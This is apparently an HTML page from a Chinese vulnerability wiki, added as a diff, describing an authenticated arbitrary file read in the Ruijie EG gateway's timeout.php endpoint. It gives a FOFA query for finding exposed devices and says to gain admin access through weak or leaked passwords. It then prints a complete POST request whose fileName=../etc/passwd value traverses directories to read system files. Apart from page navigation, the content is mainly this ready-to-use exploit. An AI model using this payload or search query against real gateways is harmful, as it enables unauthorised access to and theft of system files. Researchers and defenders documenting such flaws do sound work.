@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3timeout.php%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>锐捷EG易网关timeout.php后台任意文件读取漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9510\u6377EG\u6613\u7f51\u5173timeout.php\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3vpn_quickset_service%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3vpn_quickset_service%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷EG易网关vpn_quickset_service远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3phpinfo.view.php%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3phpinfo.view.php%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 EG易网关phpinfo.view.php 信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="egtimeoutphp">锐捷EG易网关timeout.php后台任意文件读取漏洞<a class="headerlink" href="#egtimeoutphp" title="Permanent link">&para;</a></h1>
+<p><strong><font style="color:rgb(38, 38, 38);">一、漏洞简介</font></strong></p>
+<p><font style="color:rgb(38, 38, 38);">锐捷EG易网关timeout.php后台任意文件读取漏洞 </font></p>
+<p><strong><font style="color:rgb(38, 38, 38);">二、影响版本</font></strong></p>
+<p>锐捷 EG易网关<br />
+<strong><font style="color:rgb(38, 38, 38);">三、资产测绘</font></strong><br />
+<font style="color:rgb(38, 38, 38);">●登录页面</font></p>
+<p><font style="color:rgb(38, 38, 38);">fofa:</font><code>app="Ruijie-EG易网关"</code></p>
+<p><img alt="1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png" src="./img/yxrLThOg1twrBoJM/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-724511.webp" /></p>
+<p><img alt="1711943727100-3a29a6a6-7b50-4246-af35-4ebf47636d48.png" src="./img/yxrLThOg1twrBoJM/1711943727100-3a29a6a6-7b50-4246-af35-4ebf47636d48-662596.png" /></p>
+<p><strong><font style="color:rgb(38, 38, 38);">四、漏洞复现</font></strong><br />
+1通过弱口令或账号密码泄露漏洞登录后台获取cookie  </p>
+<p><img alt="1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c.png" src="./img/yxrLThOg1twrBoJM/1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c-386082.webp" /></p>
+<p>2通过上一步获取的cookie执行命令</p>
+<div class="highlight"><pre><span></span><code>POST /system_pi/timeout.php?a=getFile HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
+X-Requested-With: XMLHttpRequest
+Host: 
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: close
+Content-Length: 22
+
+fileName=../etc/passwd
+</code></pre></div>
+<p><img alt="1714062449229-3cce8ba1-8f09-4704-bcf3-73117674ac5a.png" src="./img/yxrLThOg1twrBoJM/1714062449229-3cce8ba1-8f09-4704-bcf3-73117674ac5a-281506.png" /></p>
+<blockquote>
+<p>更新: 2024-06-24 11:42:25<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/oyykknetnegphzzm">https://www.yuque.com/xiaokp7/ocvun2/oyykknetnegphzzm</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3vpn_quickset_service%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3vpn_quickset_service%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷EG易网关vpn_quickset_service远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3phpinfo.view.php%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3phpinfo.view.php%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 EG易网关phpinfo.view.php 信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
